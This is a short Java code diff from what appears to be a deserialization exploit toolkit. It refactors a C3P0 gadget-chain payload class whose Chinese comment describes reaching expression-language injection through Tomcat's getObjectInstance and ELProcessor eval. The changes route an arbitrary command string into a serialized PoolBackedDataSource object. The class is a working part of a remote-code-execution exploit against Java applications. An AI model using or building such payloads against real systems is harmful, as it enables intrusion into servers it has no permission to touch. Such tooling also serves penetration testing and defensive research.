@@ -22,10 +22,10 @@ import java.util.logging.Logger;
 /**
  * C3P02 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
  */
-public class C3P02 {
+public class C3P02 implements ObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String               command = String.valueOf(type);
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String               command = param[0];
         PoolBackedDataSource b       = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
 
@@ -36,6 +36,11 @@ public class C3P02 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 
 
